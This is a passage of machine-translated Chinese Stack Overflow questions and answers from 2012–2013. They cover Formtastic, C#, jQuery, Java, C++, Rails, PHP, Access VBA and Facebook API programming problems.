> 
> 时间：2013-01-20T00:02:27.353

可能更好和正确的方法是使用**:label**键并保留 :button_html 进行样式设置

```
<%= form.action :submit, :label => "Submit", :button_html => { :class => "lagoon" } %> 
```

我认为最好的办法是使用 I18n 键。检查[Formtastic 文档](https://github.com/justinfrench/formtastic)：

Formtastic 按以下顺序决定使用哪个标签：

1.  :label # :label => "选择标题"
2.  Formtastic i18n # if :label => true || i18n_lookups_by_default = true（参见国际化）
3.  Activerecord i18n # 如果找到给定属性的本地化文件
4.  label_str_method # 如果没有提供，默认为 :humanize 但可以设置为自定义方法

[https://github.com/justinfrench/formtastic](https://github.com/justinfrench/formtastic)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-08T14:35:59.840

原来我需要做：

```
<%= form.action :submit, :button_html => { :value => 'Submit', :class => "lagoon" }  %> 
```

# c - C中的图形算法通过将网格读入数组

> ID：11866228
> 
> 赞同：0
> 
> 时间：2012-08-08T14:04:22.213
> 
> 标签：c, algorithm, graph-algorithm

我需要从控制台读取一些对象。这有点像用 C 编写的战舰游戏。想想我有一个 6x6 数组的平台。我从用户那里获取用户输入，char 'X' 表示它是二维数组中的阴影区域。我正在为 36 个位置分配字符。用户给出输入后的数组示例是；

```
0,0                       0,6      

  X              XXX
 X                X  
   XX             X 
     X

6,0                       6,6 
```

抱歉输出不太清楚。这是用户输入的X个字符的输出。两组中的'x'字符是联合的，所以图中有2个对象。我需要计算数量组。X 字符的方向不能是对称的，所有的事情都是可能有一组 x 字符是联合的，我想计算这些组

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:09:54.223

将问题建模为图形（正如您已经理解的那样）：`G=(V,E)`，`V`您的网格在哪里（或者`x`更准确地说只有 's），以及`E = { (u,v) | there is X in both u and v }`

在解析期间，将所有坐标保存在一个容器中，并将每个坐标映射到一个布尔值，指示它是否被访问过。

现在，在仍有未访问过的 x 时重复：
运行一个图发现算法（[BFS](http://en.wikipedia.org/wiki/Breadth-first_search)是一个例子）从此（未访问过）`x`，并标记`x`在发现算法运行期间遇到的所有访问过的

迭代次数（调用 BFS 的次数）是组数。

# c# - 将字符串转换为作为字符串的泛型类型

> ID：11866229
> 
> 赞同：7
> 
> 时间：2012-08-08T14:04:36.567
> 
> 标签：c#, string, generics, casting

我正在编写一种方法来进行智能类型转换 - 如果类型参数恰好是字符串，则使用 ToString() ，否则进行转换，但如果转换不起作用则返回 null 。`v`基本上可以在不引发异常的情况下从中获取尽可能多的信息。

在我尝试演员之前，我检查了这`T`确实是一个`string`，但编译器仍然不是粉丝：

```
Cannot convert type 'string' to 'T' 
```

这是我的方法：

```
public T? Convert<T>(object v)
{
    if (typeof(T) == typeof(string)) {
    return (T)v.ToString(); // Cannot convert type 'string' to 'T'  
    } else try {
      return (T)v;
    } catch (InvalidCastException) {
    return null;
    }
} 
```

也让我知道这是否是某种不可饶恕的罪过。我正在使用它来处理一些可能具有混合类型的数据结构。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-08-08T14:07:22.217

`object`转换为泛型类型时，您基本上需要通过：

```
return (T)(object) v.ToString() 
```

和

```
return (T)(object) v; 
```

我会使用`is`而不是捕捉`InvalidCastException`。

请参阅[Eric Lippert 最近的博客文章](http://blogs.msdn.com/b/ericlippert/archive/2012/07/10/when-is-a-cast-not-a-cast.aspx)，了解为什么这是必要的更多详细信息。

尤其：

> 因为编译器知道这种转换可能成功的唯一方法是 if`U`是 bool，但`U`可以是任何东西！编译器假定大部分时间`U`不会用 构造`bool`，因此这段代码几乎肯定是一个错误，编译器会提醒您注意这一事实。

（代替`T`和代替`U`... ）`string``bool`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T14:07:13.907

你需要转换你的字符串，`object`因为你的返回类型是通用的，即

```
return (T)(object)v.ToString(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:08:45.593

`object`在转换为之前尝试转换为`T`

```
return (T)(object)v; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T17:23:54.953

```
using System.ComponentModel; 
```

...

```
public T Convert<T>(object v) {
    return (T)TypeDescriptor.GetConverter(typeof(T)).ConvertFrom(v);
} 
```

警告，如果 T 和 v 中包含的对象之间不存在转换，这将引发异常。

# c# - 如何让 System.Windows.Forms.Timer 在启动时立即运行 Tick 处理程序？

> ID：11866232
> 
> 赞同：3
> 
> 时间：2012-08-08T14:04:42.503
> 
> 标签：c#, timer

以下`Timer`是`System.Windows.Forms.Timer` C# 代码：

```
Timer myTimer = new Timer();
myTimer.Interval = 10000;
myTimer.Tick += new EventHandler(doSth);
myTimer.Start(); 
```

定时器会`doSth`每 10 秒一次，但是如何让它`doSth`在启动时立即启动呢？

我试图创建一个扩展的自定义计时器`Timer`，但我无法覆盖该`Start`方法。

现在，我的代码是：

```
myTimer.Start();
doSth(this, null); 
```

我不认为这很好。如何改进它？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-08T14:09:27.900

这是完美的。不要改变任何事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:13:27.047

我不确定您的确切要求，但为什么不将代码放在另一个方法中的计时器回调中呢？

例如

```
private void tmrOneSec_Tick(object sender, System.EventArgs e)
{
    DoTimerStuff();
}

private void DoTimerStuff()
{
    //put the code that was in your timer callback here
} 
```

这样你就可以在应用程序启动时调用 DoTimerStuff() 。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:16:36.977

计时器必须具有表单级别范围，并且不清楚您是否拥有它。出于好奇，我举了一个小例子，它对我有用：

```
 private void Form1_Load(object sender, EventArgs e)
    {
        txtLookup.Text = "test";
        DoSomething();
        timer1.Start();
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
        DoSomething();
    }

    private void DoSomething()
    {
        txtLookup.Text += "ticking";
    } 
```

每隔 10 秒，它会在文本框中的文本上附加另一个“滴答”。

你说，

> “定时器每10秒做一次，但如何让它在启动时立即做？”

我说，在调用计时器的 start 方法之前立即调用 doSth

# jquery - jquery对话框关闭asp.net按钮单击

> ID：11866234
> 
> 赞同：2
> 
> 时间：2012-08-08T14:04:47.250
> 
> 标签：jquery, asp.net, button, dialog, onclick

我有一个名为 A 的 aspx 页面，它正在使用母版页。页面A有一个链接按钮，点击链接按钮我想打开一个加载名为B的aspx的jquery对话框。这对我来说很好。我在页面 B 上有一个 asp.net 取消按钮`enter code here`，在取消按钮上单击我想关闭 jquery 对话框并留在页面 A。在我的代码中，jquery 对话框正在关闭，但它在浏览器中重新加载页面 B。

母版页

```
<%@ Master Language="C#" AutoEventWireup="true" CodeBehind="Site1.master.cs" Inherits="jQueryTest.Site1" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Untitled Page</title>
    <asp:ContentPlaceHolder ID="head" runat="server">
    </asp:ContentPlaceHolder>

    <script src="../javascript/jquery-1.7.2.min.js" type="text/javascript"></script>

    <script src="../javascript/jquery-ui-1.8.22.custom.min.js" type="text/javascript"></script>

    <link href="/css/ui-lightness/jquery-ui-1.8.22.custom.css" rel="stylesheet" type="text/css" />

    <script type="text/javascript">
    $(document).ready(function () {
        var mydiv = $("#dialog").dialog({   
            autoOpen: false,
            resizable: false,
            height: 700,
            width: 900,
            modal: true            
        });        
        mydiv.parent().appendTo(jQuery("form")); 

        });

        function showPanel(){
        var mydiv = $("#dialog")
        // Load the content using AJAX
        mydiv.load('/WebForm1.aspx');
        // Open the dialog        
        mydiv.dialog('open');

        }
    </script>

</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:ContentPlaceHolder ID="ContentPlaceHolder1" runat="server">
        </asp:ContentPlaceHolder>
    </div>
    </form>
</body>
</html> 
```

default.aspx（A 页）

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" MasterPageFile="~/Site1.Master"
    Inherits="jQueryTest._Default" %>

<asp:Content ID="contect1" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
    <div>
        <asp:LinkButton ID="lnkChangePwd" Text="Click" OnClientClick="showPanel();return false;"
            runat="server"></asp:LinkButton>
    </div>
    <div id="dialog" style="width: 60%; height: 45%" title="Change password">
    </div>   

</asp:Content> 
```

webform1.aspx(B页)

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="WebForm1.aspx.cs" Inherits="jQueryTest.WebForm1" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Untitled Page</title>

    <script src="../javascript/jquery-1.7.2.min.js" type="text/javascript"></script>

    <script src="../javascript/jquery-ui-1.8.22.custom.min.js" type="text/javascript"></script>

    <link href="/css/ui-lightness/jquery-ui-1.8.22.custom.css" rel="stylesheet" type="text/css" />

    <script type="text/javascript">

    $(document).ready($(function () {
     $("#<%=Button1.ClientID %>").bind("click", function (event) {
    $("#dialog").dialog("close");    

});

}));

    </script>

</head>
<body>
    <form id="form1" runat="server">
    <div>
        this is webform 1
        <asp:Button ID="Button1" runat="server" Text="Button" />
    </div>
    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T16:45:55.120

像这样的东西对我有用......

显示对话框的页面...

```
<html>
<head>
    ...link js files here...
</head>
<body>
    <div id="deleteDialog"></div>
</body>
</html> 
```

作为对话框内容的页面...

```
<html>
<head>
    ...link js files here...
</head>
<body>
    <input type="submit" value="Close" id="uxCloseDialog" />
</body>
</html> 
```

jquery 显示和关闭对话框...

```
var deleteDialog;

deleteDialog = $("#deleteDialog").dialog({
    autoOpen: false,
    resizable: false,
    width: "auto",
    modal: true
});

$(".button-delete-24").click(function () {
    var id = $(this).attr('data-id');
    deleteDialog.empty();
    deleteDialog.load("/myDialogPage.aspx"
        , function () {
            $("#uxCloseDialog").click(function () {
                deleteDialog.dialog("close");
                return false;
            });
        });
    deleteDialog.dialog("open");
    return false;
}); 
```

我确实使用[jQuery UI](http://jqueryui.com/)，所以我不确定是否有额外的功能可供我使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T17:48:10.220

尝试使用 window.parent：

```
window.parent.jQuery("#dialog").dialog('close'); 
```

# javascript - 下个月启动 MooTools 活动日历

> ID：11866238
> 
> 赞同：0
> 
> 时间：2012-08-08T14:05:01.257
> 
> 标签：javascript, calendar, mootools

我正在使用这个日历[http://dansnetwork.com/mootools/events-calendar/usage/](http://dansnetwork.com/mootools/events-calendar/usage/)。我不明白如何开始下个月的日历，如果当前月份是 8 月，我想从 9 月开始。

我试过的：

```
 var date = new Date();
    var d = date.getDate();
    var m = new Date(date.getMonth() +1 );
    var y = date.getFullYear();

 $('#calendar1').fullCalendar({
      editable: true,
      events: [
        {
          title: 'All Day Event',
          start: new Date(y, m, 1) 
```

但它不起作用。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T17:05:30.840

查看源代码似乎没有一个选项可以明确设置最初显示的月份。但是，有一个`newDate`选项可以让您设置初始选定的日期，我猜它可以显示您想要的月份。

[http://dansnetwork.com/mootools/events-calendar/source/](http://dansnetwork.com/mootools/events-calendar/source/) （第 22 行）

# jquery - 在 JQuery 切换类上添加事件

> ID：11866239
> 
> 赞同：2
> 
> 时间：2012-08-08T14:05:07.267
> 
> 标签：jquery, toggleclass

我的标记：

```
<ul id="playerControls">
    <li class="play-bt"></li>
</ul> 
```

如果按下播放按钮，我会触发此事件：

```
$(".play-bt").bind('click',function(){
    $(this).toggleClass('pause-bt');
}); 
```

现在我假设`play-bt`类名已更改为`pause-bt`，但是这个事件是怎么来的：

```
$(".pause-bt").bind('click',function(){
    console.log('PEW');
}); 
```

是不是被解雇了？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:07:34.070

> 现在我假设 .play-bt 类名已更改为 pause-bt。

`toggleClass`不能那样工作。

`toggleClass`是 和 的`addClass`组合`removeClass`。

`toggleClass`将检查指定的类是否存在。

*   如果是，则将其从元素中删除。
*   如果没有，它会将其添加到元素中。

* * *

关于您的事件未触发的原因，这是因为您必须在分配 class**之前**`pause-bt`绑定该 click 事件。

`bind()`*在当前点*搜索与选择器匹配的所有元素，并将函数分配给事件处理程序。

您需要重新绑定此事件，或使用`live()`而不是`bind()`

`live()`：

> 为现在和将来匹配当前选择器的所有元素附加一个事件处理程序。

[http://api.jquery.com/live/](http://api.jquery.com/live/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T14:07:18.563

`.bind()`仅捕获当时存在的元素。由于您的元素最初没有该类，因此它没有被绑定。根据您的 jQuery 版本，您需要`.live()`或`.on()`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:10:10.710

因为当您设置绑定时，您定位的元素没有该类。使用 jQuery .on() 函数并像这样绑定到容器：

```
$('#playerControls').on('click', '.pause-bt', function(){
      console.log('PEW');
}); 
```

该事件将在#playerControls 上触发，此时它将查找*.paust* -bt

# php - Sublime Text 2 Php Snippet 省略变量

> ID：11866241
> 
> 赞同：3
> 
> 时间：2012-08-08T14:05:16.420
> 
> 标签：php, code-snippets

我在 sublime text 2 中创建了以下代码段，但是当我在 Php 脚本中使用它时，它会自动删除所有变量（而不是它们的值）。

```
<snippet>
<content><![CDATA[

include 'constants.php';

// Defining connection

$connection = mysqli_connect(HOST, USERNAME, PASSWORD);

// If unable to connect

if(!$connection)
{
$error = 'Unable to connect to database server';
echo $error;
exit();
}

// Checking the encoding

if(!mysqli_set_charset($connection, 'utf8'))
{
$error =  'Unable to set database connection decoding';
echo $error;
exit();
}

// Selecting Database

if (!mysqli_select_db($connection, DATABASE))
{
$error = 'Unable to locate the .'. DATABASE;    
echo $error;    
exit();
}
]]></content>
<!-- Optional: Set a tabTrigger to define how to trigger the snippet -->
<tabTrigger>phpMysqlConnection</tabTrigger>
<!-- Optional: Set a scope to limit where the snippet will trigger -->
<!-- <scope>source.php</scope> -->
</snippet> 
```

到底发生了什么？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-08T14:37:31.243

您需要使用反斜杠“\”转义每个“$”。

```
\$error; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T14:16:38.960

在变量前面放一个 \ 字符，因为 sublime text 使用 $ 符号作为占位符。

# java - 如果元素更改位置，则对两个 ArrayList 进行排序，另一个 arraylist 中的第二个也更改位置

> ID：11866242
> 
> 赞同：0
> 
> 时间：2012-08-08T14:05:21.693
> 
> 标签：java, arraylist

我正在使用 java，我需要一些想法，我有两个数组列表`lis1`和`lis2`. 第一个包含元素

`lis1[a,b,c,d]`

第二个

```
lis2[a',b',c',d'] 
```

`lis1`例如，如果我对我的第一个列表进行 排序，`lis1[b,c,a,d]`我希望第二个成为`lis2[b',c',a',d']`. 我需要一些帮助只是一个想法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:09:04.830

在我看来，您在这里有*一个*列表，其中填充了每个包含 a 和 a'、b 和 b' 等的对象。

例如类似的东西`List<Pair>`

where`Pair`是一个包含两个元素的对象。然后，您可以编写一个比较器，用于`Pair`简单地比较每个`Pair`对象的第一个元素。

我不会在这里使用两个列表。您必须使它们保持同步，而这充其量似乎很脆弱。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:08:12.397

一种方法可能是，使用所需的排序逻辑编写您自己的[比较器。](http://www.javadeveloper.co.in/java-example/java-comparator-example.html)排序时在两个列表上应用相同的比较器。

# c# - 是否可以覆盖 HttpRequest 类的 UserHostAddress 属性？

> ID：11866254
> 
> 赞同：5
> 
> 时间：2012-08-08T14:05:56.863
> 
> 标签：c#, asp.net, vb.net, proxy-server

我有一种情况，我需要将我的应用程序放在代理服务器后面，这会导致进入我的应用程序的所有请求都具有代理服务器使用的同一组 IP 地址。但是，代理服务器在自定义标头中提供请求者的真实 IP 地址，我可以通过我的应用程序使用它，这样我就可以知道请求者的真实 IP 地址。这主要用于记录和跟踪。有没有办法让 UserHostAddress 属性从这个自定义标头返回值？这会节省很多工作，因为这个属性引用了大约几百次。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:50:27.417

无法更改 UserHostAddress 属性的行为，但是您可以做的是向 Request 类添加一个扩展方法（类似于 GetRealUserHostAddress()），然后在 UserHostAddress -> GetRealUserHostAddress() 上进行全局替换以快速排序它在您的解决方案中的所有实例。

```
public static string GetRealUserHostAddress(this HttpRequestBase request)
{
    return request.Headers["HeaderName"] ?? request.UserHostAddress;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:26:00.137

如果您说代理返回发出请求的客户端的真实 IP 地址，则无需使用`UserHostAddress`读取它；您可以直接阅读标题：

```
string realIP = HttpContext.Request.Headers["actual_header_key"]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:26:12.493

不，这是不可能的。您可以阅读自定义标头并将其放置在请求上下文中并稍后使用。

# vba - 在 Access 中导入 Excel 数据

> ID：11866255
> 
> 赞同：0
> 
> 时间：2012-08-08T14:06:04.380
> 
> 标签：vba, ms-access

我的 Access 应用程序中有一个表格，需要用一堆 Excel 文件中的数据填充。我试过这段代码：

```
DoCmd.TransferSpreadsheet acImport, acSpreadsheetTypeExcel8, strTable, strExcelpath, True 
```

但它每次都会覆盖我的访问表中的数据而不是附加它，并且它绝对无法控制发送的内容。

我需要找到一种方法来简单地将 Excel 文件中的数据附加到我的 Access 表中，这两个文件具有相同的结构，所以我想知道是否有一种方法可以在不指定列的情况下逐行导入它。但是，出于个人知识和对用户使用的恐惧，考虑到行和列，我也想知道如何导入它。

谢谢 ！

编辑：在 Excel 文件上选择代码：

```
Dim cn As ADODB.Connection
Dim strQuery As String

Set cn = New ADODB.Connection
With cn
    .Provider = "Microsoft.Jet.OLEDB.4.0"
    .ConnectionString = "Data Source=" & Application.CurrentProject.Path & "\Excel\test.xls;" & _
                        "Extended Properties=Excel 8.0;"
    .Open
End With

strQuery = "INSERT INTO tblClients " & _
        "SELECT * FROM [Excel 8.0;HDR=YES;DATABASE =" & Application.CurrentProject.Path & "\Excel\test.xls].[tblImport$]"
DoCmd.RunSQL strQuery 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:16:22.470

您还可以在查询中引用 Excel 工作表或范围：

```
INSERT INTO Table1 ( ADate ) 
SELECT SomeDate FROM [Excel 8.0;HDR=YES;DATABASE=Z:\Docs\Test.xls].[Sheet1$a1:a4] 
```

或者

```
INSERT INTO Table1
SELECT * FROM [Excel 8.0;HDR=YES;DATABASE=Z:\Docs\Test.xls].[Sheet1$] 
```

在一个过程中：

```
Sub RunThisQuery()
    strQuery = "INSERT INTO tblClients " & _
       "SELECT * FROM [Excel 8.0;HDR=YES;DATABASE=" _
       & Application.CurrentProject.Path & "\Excel\test.xls].[tblImport$]"

    CurrentDB.Execute strQuery, dbFailOnError
End Sub 
```

请注意，您的代码中有一个空格`DATABASE`。必读`DATABASE=`，无空格。

# java - 删除二叉树 - 设计建议

> ID：11866261
> 
> 赞同：4
> 
> 时间：2012-08-08T14:06:26.373
> 
> 标签：java, recursion, tree, binary-tree

我写了一个代码来删除树的所有元素。需要以下建议：

1.  在 reverseTreeStack 方法中，我可以不使用堆栈方法参数进行设计吗？
2.  我可以用一种更好的设计方法设计整个代码吗？

更新：将 reverseTreeStack 的返回类型更改为 void。删除了堆栈的附加变量。

```
 public class DeleteTree {

    public static void deleteTree(BinaryTreeNode root)
    {       
        Stack stack = new Stack();
        reverseTreeStack(stack, root);
        while (!stack.isEmpty())
        {
            BinaryTreeNode node = (BinaryTreeNode)stack.pop();
            System.out.println("---------Deleting----------->" + node.getData());
            node = null;
        }
    }

    public static void reverseTreeStack(Stack stack,BinaryTreeNode root)
    {
        if (root != null)
        {
            stack.push(root);   
            reverseTreeStack(stack,root.getLeft());
            reverseTreeStack(stack, root.getRight());
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:15:45.710

为什么需要这样做？如果我没记错的话，一旦没有可用的资源引用，JVM 就可以释放资源，因此只需将根节点设置为 null 就可以释放整个树。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:26:45.347

我认为，James 是对的，但是如果你想练习树遍历，或者如果你想用一种需要手动释放内存的语言来实现它，那么使用递归：

```
void deleteTree(TreeNode node)
{
    if(node==null)return;

    deleteTree(node.getLeft());
    deleteTree(node.getRight());

    System.out.printline("Deleting: "+node.getData())
    node = null;
} 
```

还要看看[Postorder Traversal](http://www.brpreiss.com/books/opus4/html/page259.html)（这是唯一的，适用于删除）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:15:23.317

好吧，如果您的树太大，您的`reverseTreeStack`方法可能会给您一个`StackOverflowError`错误，因此使用循环而不是递归可能是更好的选择（除非您知道您的树永远不会那么大）。

另外，为什么要“删除”每个节点？（`node = null`实际上只是删除了您在该方法中的引用...）`root = null`如果您以经典的 Node(parent, leftChild, rightChild) 方式构建它而不存储，通常只是忘记根 () 将删除整个树指向其他任何地方的节点的指针。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-08T14:18:13.550

1）我认为您可以在直接操作堆栈时杀死返回值并使其成为 void 方法。所以就这样做

```
 Stack stack = new Stack();
 reverseTreeStack(stack, root);

 // Now just use stack 
```

2）不要把事情浓缩成一种方法。将事物分解为更多方法将使您的代码更易于导航和理解。每个功能负责的越少，阅读它的人就越有意义。

# c++ - 在 C++ 中使用友元函数有什么额外的好处？

> ID：11866267
> 
> 赞同：2
> 
> 时间：2012-08-08T14:06:40.997
> 
> 标签：c++

我对 C++ 中的朋友函数有疑问。我知道如果一个函数被定义为一个类的友元函数，它可以访问任何成员变量或函数，无论它是私有的、受保护的还是公共的。最近在使用 doxygen 创建文档引用，发现友元函数的另一个优点：它与类的关系可以很容易地说明，因为友元函数会在 HTML 页面中的成员函数之后列出。但是，如果该函数没有被定义为friend，它将被视为一个全局函数，并且使用doxygen它不会与类文档一起列出。然后我打算将所有与特定类有关系的全局函数作为它的友元函数。我想知道这是否是一个好习惯。

以下代码显示一个函数可以选择为友元函数或全局函数。

```
#include <iostream>
#include <map>
#include <set>
#include <iostream>
#include <algorithm>
#include <vector>
#include <functional>
#include <numeric>
#include <string>
using namespace std;

class ABCD
{
public: 
    int a;
    int b;
    friend void friend_fun(const ABCD &obj);
};

void fun(const ABCD &obj)
{
    std::cout<<obj.a<<endl;
    std::cout<<obj.b<<endl;
};

void friend_fun(const ABCD &obj)
{
    std::cout<<obj.a<<endl;
    std::cout<<obj.b<<endl;
};

int main () 
{
     ABCD obj;
     obj.a = 20;
     obj.b = 30;
     fun(obj);
     friend_fun(obj);

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-08T14:21:31.720

Doxygen 允许您创建和引用[函数组和其他全局事物](http://www.doxygen.nl/manual/grouping.html)。这比仅仅为了利用 Doxygen 的一个怪癖而破坏有用的语言级保护更有意义。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:11:41.147

我不会为了适应文档工具的缺点而更改我的代码。所以，不，我不认为这是一个好习惯。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:18:17.843

使用友元函数机制从来都不是一个好习惯，所以尽量避免它。类定义之外的任何内容都不应访问其私有数据。C++ 鼓励你使用封装/模块化机制，而友元定义只会削弱这种机制。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:55:09.067

基于答案，将所有全局函数声明为友元函数绝对不是一个好习惯。Doxygen 还提供了一个关键字来连接与类有密切关系的函数： [/relates](http://www.doxygen.nl/manual/commands.html#cmdrelates)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-04-25T17:21:10.097

我在这里同意 Mike 的观点，但想再提几点关于我理解的朋友功能的几点。- 友元函数是不可传递的。这使友元函数保持在声明为本地的类的本地。- 朋友功能不继承。这样，友元函数仅是声明它们为友元的类的友元。将特定函数声明为友元而不是全部是类所有者完全有意识的决定。- 在成员函数 [getter 和 setter] 的情况下，它们在类继承链中可用。- 此外，需要使用 2 个独立类的功能可以使用友元函数来实现，而无需对这些类进行任何更改。

# ruby-on-rails - 更正 Rails 中的无效资源路由

> ID：11866269
> 
> 赞同：1
> 
> 时间：2012-08-08T14:06:45.297
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2, routes, nested-routes

在 Rails 中使用嵌套资源路由时我注意到的一件事是，从技术上讲，用户可以访问子资源存在的路由（因此可以正确显示），但是父资源的 id 表示一个对象实际上与子资源无关。

例如，在路由`users/:user_id/post/:id`中，用户可以输入一个路由，其中`:user_id`​​表示没有发布对应于 的帖子的用户`:id`。

解决此问题的最佳方法是什么，以便如果用户访问无效的 URL，服务器会将用户重定向到正确的 URL？

我已经在我的控制器中放置了一些代码来处理这个问题，但是必须检查每个控制器操作中的路径然后将用户重定向到适当的 url，这有点尴尬，特别是因为每个操作的 URL 帮助程序都不同。

( `edit_user_post_path(@user, @post)`, `new_user_post_path(@user, @post)`)

必须有更好的方法，对吧？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T17:57:42.623

您应该`before_filter`运行所有请求以确保用户有效。如果没有，它将抛出`ActiveRecord::RecordNotFound`并显示友好的 404 页面。

然后根据用户的需要抓取帖子，无论是在另一个`before_filter`还是直接在动作中。基于用户的帖子搜索。我下面的示例演示了如何使用另一个`before_filter`.

```
before_filter :find_user_by_user_id
before_filter :find_post

def show
  # Use @post variable here however you need
end

private

def find_user_by_user_id
  @user = User.find(params[:user_id])
end

def find_post
  # This assumes you have an association set up as needed
  @post = @user.posts.where(id: params[:id]).first

  if @post.nil?
    # Do whatever you need here
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:25:26.667

首先，您应该知道 ROR 引发的错误将在生产环境中显示消息“对不起，但您要查找的页面不存在”。

因此，我不会担心这一点。如果您想“捕获”故障并快速重定向到您可能有兴趣使用该`rescue`方法的安全区域。

[http://www.simonecarletti.com/blog/2009/12/inside-ruby-on-rails-rescuable-and-rescue_from/](http://www.simonecarletti.com/blog/2009/12/inside-ruby-on-rails-rescuable-and-rescue_from/)

玩得开心

# nosql - ARM Debian 的文档数据库

> ID：11866270
> 
> 赞同：3
> 
> 时间：2012-08-08T14:06:58.280
> 
> 标签：nosql, arm, debian, document-oriented-db

最近我开始编写一个应用程序，它的文档数据库似乎是数据存储的完美匹配。

我想使用 MongoDB，但后来我发现我的“主机”没有合适的包（Sheeva Plug with debian）。

我在网上寻找与 mongoDB 类似的东西，但找不到令人满意的结果。

任何人都知道在 ARM 上运行的任何文档数据库吗？欢迎添加 Python 模块。

附言。CouchDB 是不行的。我知道 git 上有非 x86 Mongo 包，但它也不是。

# api - 按用户顺序从 Facebook Graph API 或 FQL 检索收藏夹（即喜欢）

> ID：11866271
> 
> 赞同：0
> 
> 时间：2012-08-08T14:07:02.913
> 
> 标签：api, facebook-graph-api, facebook-like, facebook-fql

从 facebook.com 的前端查看您的收藏夹时`facebook.com/[username]/favorites`，可以排列这些收藏夹，前五个显示为缩略图。

是否可以按照用户在其个人资料中定义的相同顺序从 api 中检索喜欢的内容？根据我在玩`/me/music`fql 表时发现的情况，这似乎是不可能的。

在我看来，如果我们能够知道他们如何订购他们的最爱，我们就可以为 Facebook 用户创建更有意义的应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-28T21:37:29.513

使用最新的 Facebook 设计（2013 年 6 月），不再可能编辑各种喜欢在您的个人资料上出现的顺序。所以这个问题没有实际意义。

# php - 带有表单验证的 Datamapper 验证 - Codeigniter

> ID：11866272
> 
> 赞同：1
> 
> 时间：2012-08-08T14:07:04.943
> 
> 标签：php, codeigniter, validation, codeigniter-datamapper

我正在使用这个数据映射器[http://datamapper.wanwizard.eu](http://datamapper.wanwizard.eu)

问题是 datamapper 具有与 codeigniter 表单验证相似的验证方法。但不一样。

一个例子，一个模型管理员模型验证数组：

```
public $validation = array(
        'username' => array(
        'rules' => array('unique', 'required', 'trim', 'max_length' => 60, 'min_length' => 3),
        'label' => 'User'
    ),
        'password' => array(
        'rules' => array('required', 'trim', 'encrypt', 'min_length' => 6),
        'label' => 'Password'
    )
); 
```

但表单验证数组必须是这样的：

```
public $form_validation = array(
    array(
        'field' => 'username',
        'label' => 'User',
        'rules' => 'unique|required|trim|max_length[60]|min_length[3]'
    ),
    array(
        'field' => 'password',
        'label' => 'Password',
        'rules' => 'required|trim|encrypt|min_length[6]'
    )
); 
```

我不想为新管理员添加进行两次手动验证（第一个表单验证，在 datamapper 验证之后）。我认为有一种方法可以通过一次手动验证来实现。

对不起我的英语不好，希望你能理解。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:57:11.637

没有 CI 的表单库，单独使用 Datamapper 的验证就足够了。

当您尝试保存模型时，该`save()`方法将返回一个`true`或`false`取决于保存是否成功。如果不是模型的[`error`属性](http://datamapper.wanwizard.eu/pages/validation.html#Error.Messages)，则应填充为失败的验证生成的错误消息。消息可以从[具有适当命名键的语言文件](http://datamapper.wanwizard.eu/pages/validation.html#Custom.Error.Messages)中加载，也可以加载codeigniter 的表单验证库`form_validaton_lang.php`。

在您的控制器中，您可以像这样使用它们：

```
Class TheController extends CI_Controller {
    function save() {
        // get the model object somehow
        // ...
        // update attributes
        $model->prop0 = $this->input->post('prop0');            
